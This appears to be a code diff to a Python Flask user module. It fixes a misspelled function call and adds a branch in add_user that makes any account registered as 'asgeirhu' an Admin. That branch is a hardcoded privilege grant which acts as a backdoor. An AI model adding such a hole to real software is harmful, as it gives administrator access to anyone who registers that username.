@@ -41,6 +41,10 @@ class User(db.Model):
 
 def add_user(username, email, name):
     user = User(username, email, name)
+
+    if username=="asgeirhu":
+        user.role = "Admin"
+
     db.session.add(user)
     db.session.commit()
     return user.to_dict
@@ -78,7 +82,7 @@ def user_registered(email, username):
     return True
 
 def get_user_id(email, username):
-    if not userRegistred(email, username):
+    if not user_registered(email, username):
         raise Exception("Could not find user registered with email", email,"and username", username)
     else:
         return User.query.filter_by(email=email, username=username).first().id
